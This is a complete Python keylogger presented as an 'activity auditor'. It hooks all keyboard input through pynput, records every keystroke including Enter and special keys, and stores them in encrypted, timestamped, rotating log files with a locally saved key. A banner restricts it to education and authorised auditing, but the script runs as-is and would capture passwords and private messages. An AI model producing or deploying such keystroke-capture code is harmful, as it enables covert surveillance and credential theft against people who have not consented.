# AI Citation: I wrote the core logic and architecture for this script.
# I utilized an AI assistant (Gemini/ChatGPT/Deepseek) to help polish the syntax, optimize
# the threading/lock scope, and implement the O(1) byte tracking.

import os
import time
import queue
import atexit
import stat
import threading
from typing import Optional, Any
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

ETHICS_BANNER = """============================================================
⚠️  WARNING: FOR EDUCATIONAL & AUTHORIZED AUDITING ONLY.
Capturing input without explicit consent is strictly prohibited.
============================================================"""

class ActivityAuditor:
    """
    Encrypted activity auditor utilizing AES-256 (Fernet).
    Features O(1) byte tracking, dedicated worker thread, log rotation, and non-blocking I/O.
    """
    def __init__(self, log_file: str = "encrypted_audit.log"):
        print(ETHICS_BANNER)
        self.log_file = log_file
        self.buffer: list[str] = []
        
        self.buffer_limit_bytes = 10 
        self.current_bytes = 0
        self.lock = threading.Lock()
        
        self.log_queue: queue.Queue[Optional[str]] = queue.Queue()
        self.running = True
        self.worker_thread = threading.Thread(target=self._writer_worker, daemon=False)
        self.worker_thread.start()
        
        atexit.register(self.shutdown)
        self.key_file = "secret.key"
        self._initialize_keys()
        self.cipher = Fernet(self.key)

    def _initialize_keys(self) -> None:
        if os.path.exists(self.key_file):
            with open(self.key_file, "rb") as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(self.key_file, "wb") as f:
                f.write(self.key)
            try:
                os.chmod(self.key_file, stat.S_IRUSR | stat.S_IWUSR)
            except Exception:
                pass 

    def _writer_worker(self) -> None:
        log_handle = open(self.log_file, "ab")
        write_count = 0
        
        while True:
            data_chunk = self.log_queue.get()
            
            if data_chunk is None: 
                log_handle.flush()
                self.log_queue.task_done()
                break

            try:
                if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 5 * 1024 * 1024:
                    try:
                        log_handle.close()
                        timestamp_ext = time.strftime("%Y%m%d_%H%M%S")
                        os.rename(self.log_file, f"{self.log_file}.{timestamp_ext}.bak")
                    except Exception as e:
                        print(f"\n[!] Log rotation failed: {e}")
                    finally:
                        if log_handle.closed:
                            log_handle = open(self.log_file, "ab")

                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                structured_data = f"[{timestamp}] {data_chunk}"
                
                encrypted_content = self.cipher.encrypt(structured_data.encode())
                log_handle.write(encrypted_content + b"\n")
                
                write_count += 1
                if write_count % 1 == 0:
                    log_handle.flush() 
            
            except Exception as e:
                print(f"\n[!] I/O Error writing to disk: {e}")
            finally:
                self.log_queue.task_done()
                
        log_handle.close()

    def on_press(self, key: Any) -> None:
        try:
            k = key.char
        except AttributeError:
            if key == Key.space:
                k = " "
            elif key == Key.enter:
                k = "<ENTER>\n"
            else:
                k = f"<{str(key).replace('Key.', '').upper()}>"

        k_bytes = len(k.encode('utf-8'))
        chunk_to_queue = None
        
        with self.lock:
            self.buffer.append(k)
            self.current_bytes += k_bytes
            if self.current_bytes >= self.buffer_limit_bytes:
                chunk_to_queue = "".join(self.buffer)
                self.buffer.clear()
                self.current_bytes = 0
        
        if chunk_to_queue:
            self.log_queue.put(chunk_to_queue)

    def shutdown(self) -> None:
        if not self.running:
            return
        self.running = False
        chunk_to_queue = None
        
        with self.lock:
            if self.buffer:
                chunk_to_queue = "".join(self.buffer)
                self.buffer.clear()
                self.current_bytes = 0
                
        if chunk_to_queue:
            self.log_queue.put(chunk_to_queue)
            
        self.log_queue.put(None)
        self.worker_thread.join(timeout=3.0)
        print(f"\n[*] Audit stopped safely. Logs secured in {self.log_file}")

    def start(self) -> None:
        print(f"[*] Audit started. Key: {self.key_file} | Logs: {self.log_file}")
        with Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.shutdown()

if __name__ == "__main__":
    auditor = ActivityAuditor()
    auditor.start()